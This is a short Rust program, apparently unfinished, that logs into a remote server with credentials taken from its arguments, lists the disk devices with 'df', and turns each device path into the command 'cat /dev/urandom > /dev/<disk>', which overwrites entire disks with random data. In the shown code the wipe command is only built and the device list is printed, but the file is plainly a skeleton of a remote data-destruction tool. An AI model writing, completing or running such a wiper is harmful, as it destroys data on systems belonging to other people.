pub mod server;
use server::Server;

use std::env;

fn main() {
    let args: Vec<String> = env::args().collect();
    let (hostname, username, password) = (&args[1], &args[2], &args[3]); //x.x.x.x:port

    let server = Server {
        hostname: String::from(hostname),
        username: String::from(username),
        password: String::from(password),
    };

    let disks_data = server.execute_command("df -h --output=source | grep dev/");

    let faki = disks_data.replace("/dev/","cat /dev/urandom > /dev/");


    let quebo = disks_data.split("\n");

    for x in quebo {
        println!("{}",x)
    }
}

fn print_type_of<T>(_: &T) {
    println!("{}", std::any::type_name::<T>())
}